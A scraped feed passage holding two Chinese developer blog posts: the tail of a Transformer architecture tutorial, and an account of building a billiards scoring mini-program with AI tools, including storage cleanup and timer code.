<p>text</p>
<pre><code class="hljs language-sql" lang="sql">输入
    ↓
掩码多头自注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
编码器<span class="hljs-operator">-</span>解码器注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
前馈神经网络层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm
    ↓
输出
</code></pre>
<h4 data-id="heading-39">3.2 三种注意力机制对比</h4>





























<table><thead><tr><th>类型</th><th>查询(Q)来源</th><th>键(K)/值(V)来源</th><th>作用</th></tr></thead><tbody><tr><td>编码器自注意力</td><td>编码器输入</td><td>编码器输入</td><td>捕捉输入序列内部依赖</td></tr><tr><td>掩码自注意力</td><td>解码器输入</td><td>解码器输入</td><td>防止信息泄露，保证自回归性</td></tr><tr><td>编码器-解码器注意力</td><td>解码器上层输出</td><td>编码器输出</td><td>连接源语言和目标语言信息</td></tr></tbody></table>
<h4 data-id="heading-40">3.3 掩码机制</h4>
<h5 data-id="heading-41">因果掩码（Causal Mask）</h5>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 上三角矩阵，主对角线及以下为1，以上为0</span>
<span class="hljs-attr">mask</span> = torch.tril(torch.<span class="hljs-literal">on</span>es(seq_len, seq_len))
<span class="hljs-comment"># 形状：[1, 1, seq_len, seq_len]</span>
</code></pre>
<h5 data-id="heading-42">作用</h5>
<p>确保在生成第 t 个词时，只能看到前 t-1 个词。</p>
<h3 data-id="heading-43">四、输出生成</h3>
<h4 data-id="heading-44">4.1 线性投影与Softmax</h4>
<p>text</p>
<pre><code class="hljs">解码器输出 → 线性层 → Softmax → 概率分布
</code></pre>
<h5 data-id="heading-45">数学表示</h5>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">logits</span> = DecoderOutput · W_vocab  <span class="hljs-comment"># W_vocab ∈ ℝ^(d_model×vocab_size)</span>
<span class="hljs-attr">probs</span> = softmax(logits)
</code></pre>
<h4 data-id="heading-46">4.2 训练与推理模式</h4>
<h5 data-id="heading-47">训练阶段（Teacher Forcing）</h5>
<p>text</p>
<pre><code class="hljs language-css" lang="css">输入: &lt;SOS&gt; 我 爱 你
目标: 我 爱 你 &lt;EOS&gt;

流程:
<span class="hljs-number">1</span>. 解码器输入: &lt;SOS&gt; 我 爱 你
<span class="hljs-number">2</span>. 预测下一个词: <span class="hljs-built_in">P</span>(我), <span class="hljs-built_in">P</span>(爱), <span class="hljs-built_in">P</span>(你), <span class="hljs-built_in">P</span>(&lt;EOS&gt;)
<span class="hljs-number">3</span>. 计算交叉熵损失
</code></pre>
<h5 data-id="heading-48">推理阶段（自回归生成）</h5>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini">def generate(input_ids, <span class="hljs-attr">max_length</span>=<span class="hljs-number">50</span>):
    <span class="hljs-comment"># 编码器前向传播</span>
    <span class="hljs-attr">encoder_output</span> = encoder(input_ids)
    
    <span class="hljs-comment"># 初始化解码器输入</span>
    <span class="hljs-attr">decoder_input</span> = torch.tensor([[SOS_TOKEN_ID]])
    
    for step in range(max_length):
        <span class="hljs-comment"># 解码器前向传播</span>
        <span class="hljs-attr">decoder_output</span> = decoder(decoder_input, encoder_output)
        
        <span class="hljs-comment"># 获取下一个词的概率分布</span>
        <span class="hljs-attr">next_token_logits</span> = lm_head(decoder_output[:, -<span class="hljs-number">1</span>, :])
        <span class="hljs-attr">next_token_probs</span> = F.softmax(next_token_logits, dim=-<span class="hljs-number">1</span>)
        
        <span class="hljs-comment"># 选择下一个词（贪婪采样或束搜索）</span>
        <span class="hljs-attr">next_token_id</span> = torch.argmax(next_token_probs, dim=-<span class="hljs-number">1</span>)
        
        <span class="hljs-comment"># 如果生成了结束符，停止生成</span>
        if <span class="hljs-attr">next_token_id</span> == EOS_TOKEN_ID:
            break
            
        <span class="hljs-comment"># 将新词元添加到输入中</span>
        <span class="hljs-attr">decoder_input</span> = torch.cat([decoder_input, next_token_id.unsqueeze(<span class="hljs-number">0</span>)], dim=<span class="hljs-number">1</span>)
    
    return decoder_input
</code></pre>
<h4 data-id="heading-49">4.3 生成策略</h4>









































<table><thead><tr><th>策略</th><th>描述</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>贪婪解码</td><td>每步选择概率最高的词元</td><td>简单快速</td><td>容易陷入局部最优，缺乏多样性</td></tr><tr><td>束搜索</td><td>每步保留 k 个最佳候选序列</td><td>质量更高</td><td>计算开销大，可能产生重复</td></tr><tr><td>采样</td><td>根据概率分布随机采样</td><td>多样性好</td><td>可能生成不连贯的文本</td></tr><tr><td>温度采样</td><td>调整概率分布的平滑度</td><td>平衡质量与多样性</td><td>需要调优温度参数</td></tr><tr><td>Top-k/p采样</td><td>限制采样空间</td><td>减少低质量输出</td><td>需要选择超参数</td></tr></tbody></table>
<h3 data-id="heading-50">五、关键数学公式汇总</h3>
<h4 data-id="heading-51">5.1 注意力机制</h4>
<p><strong>缩放点积注意力：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Attention</span>(Q, K, V) = <span class="hljs-built_in">softmax</span>(QK^T / √d_k) V
</code></pre>
<p><strong>多头注意力：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">MultiHead</span>(Q, K, V) = <span class="hljs-built_in">Concat</span>(head_1, ..., head_h) W^O
head_i = <span class="hljs-built_in">Attention</span>(QW_i^Q, KW_i^K, VW_i^V)
</code></pre>
<h4 data-id="heading-52">5.2 位置编码</h4>
<p><strong>正弦余弦编码：</strong></p>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i) = <span class="hljs-built_in">sin</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d))
<span class="hljs-built_in">PE</span>(pos, <span class="hljs-number">2</span>i+<span class="hljs-number">1</span>) = <span class="hljs-built_in">cos</span>(pos / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d))
</code></pre>
<h4 data-id="heading-53">5.3 前馈网络</h4>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">FFN</span>(x) = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, xW_1 + b_1)W_2 + b_2
</code></pre>
<h4 data-id="heading-54">5.4 层归一化</h4>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">LayerNorm</span>(x) = γ ⊙ (x - μ) / √(σ² + ε) + β
其中 μ, σ 为均值和标准差，γ, β 为可学习参数
</code></pre>
<h3 data-id="heading-55">六、变体与扩展</h3>
<h4 data-id="heading-56">6.1 仅编码器模型（如 BERT）</h4>
<ul>
<li>用途：自然语言理解任务</li>
<li>结构：仅使用编码器部分</li>
<li>预训练任务：掩码语言建模、下一句预测</li>
</ul>
<h4 data-id="heading-57">6.2 仅解码器模型（如 GPT 系列）</h4>
<ul>
<li>用途：文本生成任务</li>
<li>结构：仅使用解码器部分（移除编码器-解码器注意力）</li>
<li>预训练任务：自回归语言建模</li>
</ul>
<h4 data-id="heading-58">6.3 编码器-解码器模型（原始 Transformer）</h4>
<ul>
<li>用途：序列到序列任务</li>
<li>结构：完整的编码器-解码器架构</li>
<li>应用：机器翻译、文本摘要</li>
</ul>
<h3 data-id="heading-59">七、优化技巧</h3>
<h4 data-id="heading-60">7.1 训练优化</h4>
<ol>
<li><strong>梯度累积</strong>：模拟大批量训练</li>
<li><strong>混合精度训练</strong>：减少内存占用，加快计算</li>
<li><strong>学习率调度</strong>：Warmup + 衰减策略</li>
</ol>
<h4 data-id="heading-61">7.2 内存优化</h4>
<ol>
<li><strong>梯度检查点</strong>：用时间换空间</li>
<li><strong>激活重计算</strong>：减少中间激活存储</li>
<li><strong>模型并行</strong>：将模型分布到多个设备</li>
</ol>
<h4 data-id="heading-62">7.3 推理优化</h4>
<ol>
<li><strong>键值缓存</strong>：避免重复计算</li>
<li><strong>量化</strong>：降低权重精度</li>
<li><strong>模型剪枝</strong>：移除不重要的权重</li>
</ol>
<h3 data-id="heading-63">八、应用场景</h3>
<ol>
<li><strong>机器翻译</strong>：原始应用场景</li>
<li><strong>文本生成</strong>：故事创作、代码生成</li>
<li><strong>问答系统</strong>：阅读理解、开放域问答</li>
<li><strong>文本摘要</strong>：提取式、生成式摘要</li>
<li><strong>语音识别与合成</strong>：语音到文本、文本到语音</li>
</ol>
<h3 data-id="heading-64">总结</h3>
<p>Transformer 通过完全基于注意力机制的架构，解决了传统序列模型在并行化和长程依赖方面的局限性。其核心创新包括：</p>
<ol>
<li><strong>自注意力机制</strong>：允许序列中任意位置直接交互</li>
<li><strong>位置编码</strong>：为模型注入顺序信息</li>
<li><strong>多头注意力</strong>：并行捕捉不同子空间的信息</li>
<li><strong>残差连接与层归一化</strong>：稳定深层网络训练</li>
</ol>
<p>这种架构不仅成为自然语言处理的基石，也逐渐扩展到计算机视觉、多模态学习等领域，推动了深度学习的发展。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[独立开发实战：我用 AI 写了一个台球小程序]]></title>    <link>https://juejin.cn/post/7591767753851174954</link>    <guid>https://juejin.cn/post/7591767753851174954</guid>    <pubDate>2026-01-06T06:47:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591767753851174954" data-draft-id="7591816944729047076" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="独立开发实战：我用 AI 写了一个台球小程序"/> <meta itemprop="keywords" content="前端,后端,Trae"/> <meta itemprop="datePublished" content="2026-01-06T06:47:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="白哥学前端"/> <meta itemprop="url" content="https://juejin.cn/user/430664288573789"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            独立开发实战：我用 AI 写了一个台球小程序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664288573789/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    白哥学前端
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:47:09.000Z" title="Tue Jan 06 2026 06:47:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    62
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style>




















<table><thead><tr><th/><th/></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5afc5591bc1b452e8a58e10fe4d2bc9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=jVtBBQFzmljcSU8fI8yzxftyHWI%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fbe488207884bbb815ba82ceca0a297~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=1RpWsZH3PXJXXWG5vrAEoZ93D7k%3D" alt="" loading="lazy"/></td></tr><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0011af00781849829ee0e667c3cc5580~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=vuqztWt%2Bt6DYTrbnsEqHzSfdrEc%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd6e3570ed504539a36c7ba74b14aefd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=d0bRmc0g2ZWVOeK9zky002TYugg%3D" alt="" loading="lazy"/></td></tr><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bd9bd3170254c7eb1b64735fdac949a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=8MBzLSqQK20Cvktnu1b9wj18oz0%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b9eef1c8cc841c4a7d95e59f56c9dea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=QLpia1whqMaVnM3kJ3p3%2BUHQnOk%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>作为一名既爱写代码又爱打台球的程序员，我一直想做一款“纯粹”的台球工具。市面上的 App 要么广告满天飞，要么功能单一——能计分的不能复盘，能复盘的体验太差。</p>
<p>于是，我决定自己造个轮子。完全根据我自己需要来定制化开发。</p>
<p>这款名为**“追分记”<strong>的小程序，不仅支持中式黑八/九球的复杂计分（断点续打、三人追分）、自定义训练模式（统计五分点等训练记录），还内置了一个</strong>基于物理交互的战术板**。</p>
<p>这篇文章我将从<strong>产品构思、AI 辅助设计、本地存储架构</strong>等维度，复盘这次独立开发的完整过程。</p>
<h2 data-id="heading-0">一、 从构思到落地：AI 如何加速全流程</h2>
<p>在这次开发中，我尝试了一种新的工作流：<strong>全程 AI 开发</strong>。从灵感到 UI，再到代码落地，让AI 扮演“产品助理”、“UI 设计师”、开发工程师的角色。</p>
<h3 data-id="heading-1">1.1 需求构思：解决我自己的痛点</h3>
<p>在写第一行代码前，我先整理了自己的“吐槽清单”：</p>
<ul>
<li><strong>痛点 A</strong>：打九球追分，算大金、小金、犯规扣分太烧脑，容易算错。</li>
<li><strong>痛点 B</strong>：打到一半朋友来电话，切出去回个消息，回来小程序重载了，比分全丢。</li>
<li><strong>痛点 C</strong>：想给朋友讲刚才那杆球怎么走位，手边没球桌，干讲听不懂。</li>
<li><strong>通点 D</strong>：自己平时去训练，也不知道训练的目标和效果。</li>
</ul>
<p>基于此，确定了 MVP（最小可行性产品）的三大核心功能：<strong>智能计分器、断点续打系统、便携战术板</strong>。</p>
<h3 data-id="heading-2">1.2 AI 生成 产品初稿，再生成 UI：从 Prompt 到视觉稿</h3>
<p>作为程序员，配色和 UI 往往是短板。这次我没有自己瞎折腾 CSS，而是利用 AI 生成设计灵感。</p>
<p>从一个新的项目开始，我让 <code>Trae</code> 帮我生成一个完整<code>prd</code>文档，包含需求分析，功能模块，页面细节。</p>
<p>然后让它开始实现这些功能，然而最后实现的UI界面效果很不理想。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/294aa11705d0490c975b014e7a968134~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=BGZJMzto1nkqgpMsv70S83AiQVQ%3D" alt="" loading="lazy"/></p>
<p>于是，我把这个截图扔给 <code>v0</code>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fv0.app%2F" target="_blank" title="https://v0.app/" ref="nofollow noopener noreferrer">v0.app/</a>）,让他按照这个截图的哪内容帮我从新生成一个页面UI，并且产出一个完整的配色，以便其他页面复用。提示词如下：</p>
<blockquote>
<p>你现在是个专业的UI交互设计师，帮我优化一下这个页面的UI，然后生成一个静态的html。不允许使用tailwind css，图标库可以使用lucide。需要生成一个完整的配色方案。</p>
</blockquote>
<p>最后它帮我产出了一个<code>html</code>文件，我打开一天，天啦，这也太牛逼 plus了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/183a65f6cb1a4afcb794acae1eeb980f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=su3bxkPSItxWLyUllOEJ84zg0eM%3D" alt="" loading="lazy"/>
这效果已经超出我的想象了。于是我立马让 <code>Trae</code> 把这个页面1:1还原到对应的小程序页面。</p>
<blockquote>
<p>提示词：根据 index.html 1:1还原 index.wxml 的UI。注意： index.htm 通用的root样式可以提取到公共样式中进行复用。</p>
</blockquote>
<p>拿到视觉基调后，我将其转化为全局 CSS 变量（<code>app.wxss</code>），确保全站风格统一：</p>
<pre><code class="hljs language-css" lang="css">page {
  <span class="hljs-attr">--bg-primary</span>: <span class="hljs-number">#0a0f1a</span>;
  <span class="hljs-attr">--text-primary</span>: <span class="hljs-number">#f8fafc</span>;
  <span class="hljs-attr">--accent-green</span>: <span class="hljs-number">#10b981</span>;
  <span class="hljs-attr">--card-bg</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">30</span>, <span class="hljs-number">41</span>, <span class="hljs-number">59</span>, <span class="hljs-number">0.7</span>);
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">160deg</span>, <span class="hljs-built_in">var</span>(--bg-primary) <span class="hljs-number">0%</span>, <span class="hljs-built_in">var</span>(--bg-secondary) <span class="hljs-number">100%</span>);
}
</code></pre>
<p>从最初简陋的线框图，到引入 <code>tdesign</code> 组件库，再到配合 AI 生成的图标，产品的“颜值”经过了三轮大的迭代，最终呈现出一种“极客范儿”的精致感。</p>
<p>业务逻辑和UI进行了完美的融合，没有任何bug。简直完美。</p>
<hr/>
<h2 data-id="heading-3">二、 核心技术复盘 II：本地存储的“垃圾回收”机制</h2>
<p>做“断点续打”功能时，我遇到了一个典型问题：
用户可能开了局，没打完就退出了；过几天又开了新局。久而久之，<code>Storage</code> 里会堆积大量废弃的比赛快照（Snapshot）。</p>
<p>为了解决这个问题，我设计了一套<strong>基于索引的 GC（垃圾回收）机制</strong>。</p>
<h3 data-id="heading-4">3.1 存储结构设计</h3>
<ul>
<li>索引表 (<code>ongoingMatches</code>)：记录所有“进行中”比赛的元数据（ID、时间、模式）。</li>
<li>快照数据 (<code>match_current_{id}</code>)：每场比赛的具体状态单独存一个 Key，防止单条数据过大。</li>
</ul>
<h3 data-id="heading-5">3.2 自动 GC 实现</h3>
<p>每次小程序启动或进入列表页时，触发 <code>cleanupOrphans</code> 函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/storage.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanupOrphans</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 1. 获取“存活”的比赛 ID 集合</span>
  <span class="hljs-keyword">const</span> list = ongoing.<span class="hljs-title function_">getList</span>()
  <span class="hljs-keyword">const</span> activeIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(list.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.<span class="hljs-property">id</span>))
  
  <span class="hljs-comment">// 2. 遍历 Storage 中所有的 Key</span>
  <span class="hljs-keyword">const</span> keys = wx.<span class="hljs-title function_">getStorageInfoSync</span>().<span class="hljs-property">keys</span>
  
  keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">k</span> =&gt;</span> {
    <span class="hljs-comment">// 3. 识别比赛快照 Key 格式</span>
    <span class="hljs-keyword">if</span> (k.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'zhongba_match_current_'</span>)) {
      <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Number</span>(k.<span class="hljs-title function_">split</span>(<span class="hljs-string">'_'</span>).<span class="hljs-title function_">pop</span>())
      <span class="hljs-comment">// 4. 如果 ID 不在存活列表中，视为“孤儿数据”，直接删除</span>
      <span class="hljs-keyword">if</span> (!activeIds.<span class="hljs-title function_">has</span>(id)) {
        <span class="hljs-title function_">safeRemove</span>(k)
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[GC] Cleaned up orphan match: <span class="hljs-subst">${id}</span>`</span>)
      }
    }
  })
}
</code></pre>
<p>这个机制保证了 Storage 永远只存储有用的数据，既节省空间又维护了整洁。</p>
<p>最后我还让它生成了一份数据快照，以便以后接入服务端的时候可以快速的创建数据库：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14dbbdacb6df497ab26ebc6a50e8ed28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=1qN0XP5nkjRe6QkK3eoEDMrK5uQ%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">三、 细节体验：后台计时校准</h2>
<p>小程序在切入后台（<code>onHide</code>）后，<code>setInterval</code> 定时器往往会暂停或变慢。为了保证比赛计时的准确性，不能单纯依赖定时器累加。</p>
<p><strong>解决方案：时间戳校准法</strong></p>
<ol>
<li><strong>记录时间点</strong>：<code>onHide</code> 时，记录当前时间戳 <code>runningSince</code>。</li>
<li><strong>计算差值</strong>：<code>onShow</code> 时，计算 <code>(Date.now() - runningSince)</code>。</li>
<li><strong>自动补齐</strong>：将差值加到 <code>elapsedTime</code> 中。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// pages/nine-ball/nine-ball.js</span>
<span class="hljs-title function_">onShow</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">isRunning</span>) {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    <span class="hljs-keyword">const</span> rs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">runningSince</span>
    <span class="hljs-keyword">const</span> delta = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((now - rs) / <span class="hljs-number">1000</span>)
    
    <span class="hljs-comment">// 即使在后台挂起了一小时，回来时间也会瞬间补齐</span>
    <span class="hljs-keyword">if</span> (delta &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({ <span class="hljs-attr">elapsedTime</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">elapsedTime</span> + delta })
    }
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-7">四、 总结</h2>
<p>“追分记”虽然只是一个工具类小程序，但“麻雀虽小，五脏俱全”。</p>
<ul>
<li><strong>从产品角度</strong>：它验证了从痛点出发，利用 AI 辅助设计快速落地的可行性。</li>
<li><strong>从技术角度</strong>：本地存储治理、生命周期管理等前端/小程序开发的典型场景。</li>
</ul>
<p>独立开发最迷人的地方，莫过于看着一个想法，在自己的键盘下一点点变成触手可及的现实。</p>
